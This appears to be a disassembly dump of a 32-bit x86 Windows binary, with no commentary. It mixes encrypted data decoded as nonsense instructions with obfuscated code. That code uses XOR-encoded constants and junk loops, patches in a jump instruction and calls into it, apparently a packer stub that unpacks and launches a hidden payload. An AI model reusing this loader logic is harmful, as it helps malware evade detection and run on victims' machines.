  406e81:	adc    dl,BYTE PTR ds:0xc08bbe84
  406e87:	mov    al,ds:0x59a6e39f
  406e8c:	push   ebx
  406e8d:	and    DWORD PTR [edi+0x15],ecx
  406e90:	adc    eax,0xe874aa81
  406e95:	pop    esp
  406e96:	rcl    DWORD PTR [edx],cl
  406e98:	sbb    eax,0xbd1075ab
  406e9d:	loope  0x406efb
  406e9f:	shl    ebx,cl
  406ea1:	outs   dx,BYTE PTR ds:[esi]
  406ea2:	dec    ebp
  406ea3:	bound  ebp,QWORD PTR [eax-0x3]
  406ea6:	inc    esi
  406ea7:	mov    ecx,0x8c0b1056
  406eac:	ja     0x406e7d
  406eae:	xchg   ebp,eax
  406eaf:	mov    BYTE PTR [ecx+ebp*1],0x75
  406eb3:	jl     0x406ed6
  406eb5:	cdq    
  406eb6:	mov    bh,0x1b
  406eb8:	push   edi
  406eb9:	xor    al,0x4b
  406ebb:	xchg   ebp,eax
  406ebc:	and    al,0xf3
  406ebe:	cli    
  406ebf:	pusha  
  406ec0:	iret   
  406ec1:	inc    eax
  406ec2:	call   0x44e2:0x70c7877e
  406ec9:	mov    bh,0xac
  406ecb:	push   esp
  406ecc:	add    DWORD PTR [edx],0xe7b241cb
  406ed2:	mov    dl,0xf7
  406ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed5:	imul   edi,DWORD PTR [eax],0xffffffe7
  406ed8:	(bad)  
  406ed9:	fnstenv [edi+ebx*4-0x13]
  406edd:	or     ebx,DWORD PTR [esp+edx*8]
  406ee0:	in     al,dx
  406ee1:	or     cl,BYTE PTR [ebp-0x67462d3c]
  406ee7:	stc    
  406ee8:	pop    esp
  406ee9:	cmc    
  406eea:	sti    
  406eeb:	xchg   DWORD PTR [ebx-0x75ef5a8a],ebp
  406ef1:	mov    ecx,DWORD PTR [ebp+0x69]
  406ef4:	and    cl,BYTE PTR [esi-0x62]
  406ef7:	(bad)  [edx-0x2acf048d]
  406efd:	leave  
  406efe:	je     0x406f7a
  406f00:	add    edi,ecx
  406f02:	inc    esi
  406f03:	hlt    
  406f04:	sti    
  406f05:	fidivr DWORD PTR [esi-0x39847977]
  406f0b:	fnstsw WORD PTR [ebx]
  406f0d:	mov    dl,BYTE PTR [esi]
  406f0f:	fst    DWORD PTR [eax-0x27]
  406f12:	stos   DWORD PTR es:[edi],eax
  406f13:	std    
  406f14:	std    
  406f15:	and    BYTE PTR [edx+0x45],al
  406f18:	in     eax,dx
  406f19:	or     edx,edx
  406f1b:	inc    edi
  406f1c:	mov    esp,0xfebb1ef1
  406f21:	pop    ecx
  406f22:	xchg   edi,eax
  406f23:	and    BYTE PTR [edi],0x70
  406f26:	pop    es
  406f27:	call   0xa66e141
  406f2c:	ret    
  406f2d:	test   eax,0x9475785a
  406f32:	mov    edi,0xd7a1767b
  406f37:	in     al,dx
  406f38:	inc    eax
  406f39:	xor    al,0xd2
  406f3b:	pop    ds
  406f3c:	dec    edi
  406f3d:	(bad)  
  406f3e:	mov    ch,0x83
  406f40:	pop    esi
  406f41:	pop    edx
  406f42:	xchg   esi,eax
  406f43:	dec    eax
  406f44:	mov    ecx,0xa5d787cc
  406f49:	or     eax,0x587b8cdb
  406f4e:	push   ds
  406f4f:	mov    ch,0xa2
  406f51:	rcl    BYTE PTR [edi-0x63],cl
  406f54:	retf   
  406f55:	xchg   edi,eax
  406f56:	push   0x29aba7fb
  406f5b:	jle    0x406f41
  406f5d:	adc    DWORD PTR [edx],eax
  406f5f:	dec    DWORD PTR [ebp+0x12]
  406f62:	pop    ebp
  406f63:	mov    edi,0x79cc4028
  406f68:	(bad)  
  406f69:	push   0xffffffe8
  406f6b:	and    DWORD PTR [ebp-0x1a32f293],0xfffffffd
  406f72:	push   ds
  406f73:	jo     0x406f1c
  406f75:	ja     0x406fd4
  406f77:	aad    0xf7
  406f79:	mov    dh,0x88
  406f7b:	lahf   
  406f7c:	es std 
  406f7e:	xor    bl,BYTE PTR [edx+0x15]
  406f81:	imul   ebp,DWORD PTR [edi-0x6d78f463],0xffffffc4
  406f88:	lahf   
  406f89:	push   eax
  406f8a:	pop    ds
  406f8b:	test   dl,0x56
  406f8e:	xchg   ebx,eax
  406f8f:	and    dl,bl
  406f91:	aad    0x24
  406f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f94:	and    edx,DWORD PTR [esi]
  406f96:	adc    al,0x48
  406f98:	lea    esp,[esi-0x5a61837e]
  406f9e:	(bad)  
  406f9f:	add    ch,BYTE PTR [edx+0x19]
  406fa2:	and    al,0x62
  406fa4:	xor    eax,eax
  406fa6:	sbb    eax,0xfdd5c337
  406fab:	in     al,0xbe
  406fad:	rcr    BYTE PTR [ebx],cl
  406faf:	xor    BYTE PTR [eax],bl
  406fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb2:	inc    edx
  406fb3:	pop    eax
  406fb4:	and    DWORD PTR [ecx+0x476754dc],eax
  406fba:	dec    edi
  406fbb:	sub    DWORD PTR [edx-0x76],ebx
  406fbe:	rcl    BYTE PTR [edi*2+0x5e0030ce],cl
  406fc5:	sbb    al,0xd8
  406fc7:	xlat   BYTE PTR ds:[ebx]
  406fc8:	pop    edx
  406fc9:	push   edx
  406fca:	shl    BYTE PTR [ebp-0x742eac06],cl
  406fd0:	inc    ebp
  406fd1:	mov    ds:0xe5751ec8,al
  406fd6:	call   0xca53:0x516baf4c
  406fdd:	fiadd  DWORD PTR [esi]
  406fdf:	mov    edx,0xd23d6963
  406fe4:	dec    esp
  406fe5:	clc    
  406fe6:	jo     0x406faf
  406fe8:	mov    cl,0x60
  406fea:	fsubr  DWORD PTR [edx]
  406fec:	loope  0x407029
  406fee:	jecxz  0x406fb3
  406ff0:	cli    
  406ff1:	lods   al,BYTE PTR ds:[esi]
  406ff2:	push   cs
  406ff3:	sub    dl,bl
  406ff5:	rcl    DWORD PTR [esi-0x68],0x8b
  406ff9:	and    DWORD PTR [edi-0xd],ebp
  406ffc:	ret    0xeafb
  406fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407000:	dec    eax
  407001:	cwde   
  407002:	xlat   BYTE PTR ds:[ebx]
  407003:	rol    BYTE PTR [esp+ebp*8+0x74eda9f],0x46
  40700b:	and    BYTE PTR [ecx-0x2fc10f10],dl
  407011:	ja     0x40700c
  407013:	push   esi
  407014:	test   DWORD PTR [edx+0x14bdc7fc],edi
  40701a:	lahf   
  40701b:	inc    edi
  40701c:	ret    
  40701d:	dec    esi
  40701e:	lods   eax,DWORD PTR ds:[esi]
  40701f:	push   0x280bdad7
  407024:	xchg   ebp,eax
  407025:	xchg   ebx,eax
  407026:	and    eax,0x96d194a8
  40702b:	add    cl,BYTE PTR [esp+edi*4-0x7dc3ade4]
  407032:	pop    esp
  407033:	and    ah,BYTE PTR [eax]
  407035:	inc    ecx
  407036:	arpl   WORD PTR [eax-0x4f],cx
  407039:	shr    BYTE PTR [ebp+eiz*8+0x23],1
  40703d:	shr    BYTE PTR [eax],1
  40703f:	aam    0x42
  407041:	fistp  QWORD PTR [esi]
  407043:	sub    al,0x4b
  407045:	mov    esi,0x84214822
  40704a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40704c:	ret    
  40704d:	retf   0xb46a
  407050:	outs   dx,DWORD PTR ds:[esi]
  407051:	mov    ds:0xad1d3a9b,al
  407056:	out    0xd4,al
  407058:	loopne 0x4070d3
  40705a:	mov    edx,0x8380b970
  40705f:	popf   
  407060:	inc    eax
  407061:	dec    ecx
  407062:	fbstp  TBYTE PTR [ecx]
  407064:	and    DWORD PTR [edi],ebp
  407066:	mov    eax,ds:0x225f9e6f
  40706b:	fdiv   DWORD PTR [ebp+0x45]
  40706e:	adc    DWORD PTR gs:[ecx+0x2a],esi
  407072:	xchg   DWORD PTR [edi],esi
  407074:	inc    ecx
  407075:	adc    dl,0x63
  407078:	inc    esp
  407079:	adc    dh,BYTE PTR [ebp+0x7e3d4509]
  40707f:	pop    ss
  407080:	and    bl,al
  407082:	push   eax
  407083:	mov    esi,0xcf9b83
  407088:	dec    edi
  407089:	and    dh,BYTE PTR [eax+0x6fbc80e2]
  40708f:	aam    0x3b
  407091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407092:	ret    
  407093:	loopne 0x4070cb
  407095:	mov    eax,ds:0x22493510
  40709a:	repz cwde 
  40709c:	clc    
  40709d:	or     esi,DWORD PTR [eiz*4+0xb0f2853]
  4070a4:	or     ecx,0x457fc66f
  4070aa:	xor    dl,dl
  4070ac:	ins    BYTE PTR es:[edi],dx
  4070ad:	fdivr  DWORD PTR [ebx-0x5751df49]
  4070b3:	aad    0x77
  4070b5:	cmp    BYTE PTR [eax],bh
  4070b7:	es repz es in al,0x28
  4070bc:	rcr    DWORD PTR [edx+0x1d],cl
  4070bf:	mov    al,0x39
  4070c1:	mov    dl,BYTE PTR [ecx-0x60]
  4070c4:	mov    ds:0x363a498d,eax
  4070c9:	(bad)  
  4070cb:	xchg   ebx,eax
  4070cc:	xchg   ebx,eax
  4070cd:	mov    dl,0x22
  4070cf:	push   edi
  4070d0:	xchg   ecx,eax
  4070d1:	and    BYTE PTR [ecx+0x482e1c7c],dh
  4070d7:	sbb    BYTE PTR [edi+0x7e],cl
  4070da:	push   ecx
  4070db:	call   0xf424527
  4070e0:	sbb    esp,DWORD PTR [ebp+0x6b]
  4070e3:	add    eax,0xc9993ab5
  4070e8:	mov    ah,0x80
  4070ea:	aam    0x2c
  4070ec:	dec    edi
  4070ed:	mov    dh,0xe0
  4070ef:	ins    DWORD PTR es:[edi],dx
  4070f0:	cmp    eax,0x2dfc3f5e
  4070f5:	xchg   ebx,eax
  4070f6:	fistp  QWORD PTR [edx+0x669279bd]
  4070fc:	aas    
  4070fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ff:	js     0x407094
  407101:	pop    esi
  407102:	cld    
  407103:	or     eax,0xb271ce7
  407108:	jge    0x407186
  40710a:	push   edx
  40710b:	xchg   edi,eax
  40710c:	mov    al,0xa3
  40710e:	adc    DWORD PTR [eax-0xa6ec263],edi
  407114:	loop   0x4070d1
  407116:	xor    DWORD PTR [eax],ebx
  407118:	test   BYTE PTR [esi+ecx*8-0x13450061],cl
  40711f:	cmp    edi,DWORD PTR [eax-0x49]
  407122:	pusha  
  407123:	inc    esp
  407124:	dec    BYTE PTR ds:0x5d29a97c
  40712a:	sbb    BYTE PTR [eax-0x44c2d1d7],0x75
  407131:	xor    BYTE PTR [esi-0x707b548e],0x2
  407138:	or     eax,0xfa25e120
  40713d:	mov    eax,0xa8a4ec7c
  407142:	pop    ds
  407143:	inc    esp
  407144:	xchg   esi,eax
  407145:	fwait
  407146:	ins    BYTE PTR es:[edi],dx
  407147:	mov    ah,0x7e
  407149:	std    
  40714a:	rol    DWORD PTR [edi+0x6eca7368],1
  407150:	pop    ebp
  407151:	out    dx,al
  407152:	sahf   
  407153:	je     0x407149
  407155:	push   ds
  407156:	pop    ebp
  407157:	inc    ebx
  407158:	call   0xc846:0xdeeb330a
  40715f:	and    eax,0x54e5a6ec
  407164:	cwde   
  407165:	ds pusha 
  407167:	sub    BYTE PTR [eax],bh
  407169:	ret    0x2d04
  40716c:	repnz inc esi
  40716e:	xchg   DWORD PTR [ebx-0x3a],eax
  407171:	adc    al,0x16
  407173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407174:	push   cs
  407175:	addr16 cmp al,0x18
  407178:	icebp  
  407179:	xchg   esi,eax
  40717a:	adc    al,0xe9
  40717c:	mov    al,0xc0
  40717e:	int3   
  40717f:	adc    esp,edi
  407181:	lds    esp,FWORD PTR [edi-0x7b]
  407184:	sar    DWORD PTR [eax-0x71e46ffc],cl
  40718a:	add    DWORD PTR [esi],esp
  40718c:	lods   eax,DWORD PTR ds:[esi]
  40718d:	push   0x4aa93b31
  407192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407193:	fldcw  WORD PTR [ebp-0x6]
  407196:	xchg   ebx,eax
  407197:	dec    edi
  407198:	dec    esp
  407199:	int    0xd6
  40719b:	cmp    DWORD PTR [edx-0x1a],esp
  40719e:	mov    bl,0x58
  4071a0:	pop    es
  4071a1:	sbb    ch,BYTE PTR [edx+ebp*1+0xa]
  4071a5:	sub    ah,BYTE PTR ds:0x2e8b1f2f
  4071ab:	and    esi,DWORD PTR [ebp+0x40]
  4071ae:	jbe    0x4071f3
  4071b0:	aas    
  4071b1:	push   ecx
  4071b2:	mov    dh,0xbe
  4071b4:	mov    edx,0x30504c2c
  4071b9:	push   ss
  4071ba:	fistp  DWORD PTR [edi-0x4db16f81]
  4071c0:	and    eax,0xfbeb2ac6
  4071c5:	sahf   
  4071c6:	ss leave 
  4071c8:	and    ebp,DWORD PTR [ecx]
  4071ca:	xchg   ebx,eax
  4071cb:	arpl   bx,si
  4071cd:	push   0x792920d8
  4071d2:	mov    cl,0x9d
  4071d4:	pop    eax
  4071d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071d6:	inc    esp
  4071d7:	cmp    BYTE PTR [eax-0x6180aea4],bh
  4071dd:	add    DWORD PTR [edx-0x33],0xd9ebb607
  4071e4:	adc    al,0x6d
  4071e6:	in     al,0x1f
  4071e8:	sub    ebp,DWORD PTR [ebx+0x4b]
  4071eb:	mov    dl,0x31
  4071ed:	push   edi
  4071ee:	add    ebx,DWORD PTR [ecx]
  4071f0:	xor    cl,ah
  4071f2:	in     al,0x2e
  4071f4:	retf   
  4071f5:	mov    ss,ebp
  4071f7:	mul    cl
  4071f9:	pop    ebx
  4071fa:	jb     0x407195
  4071fc:	scas   eax,DWORD PTR es:[edi]
  4071fd:	jae    0x407189
  4071ff:	sub    edx,esp
  407201:	sub    al,0x97
  407203:	sub    BYTE PTR [edi-0x65915620],al
  407209:	call   0x94ddb80b
  40720e:	sahf   
  40720f:	mov    WORD PTR [eax-0x3d],?
  407212:	xor    eax,ecx
  407214:	mov    edx,0x3272dd
  407219:	add    eax,edx
  40721b:	mov    DWORD PTR [ebp+0x8],eax
  40721e:	mov    eax,DWORD PTR [ebp-0x14]
  407221:	xor    eax,ecx
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	loope  0x4077b2
  407751:	mov    ah,0x4c
  407753:	call   0x7a5f:0x197a7a20
  40775a:	jp     0x4077ab
  40775c:	ins    BYTE PTR es:[edi],dx
  40775d:	ret    0x966f
  407760:	push   edi
  407761:	int3   
  407762:	(bad)  
  407763:	mov    esi,DWORD PTR [ebp+0x64dd37a9]
  407769:	add    al,0x5e
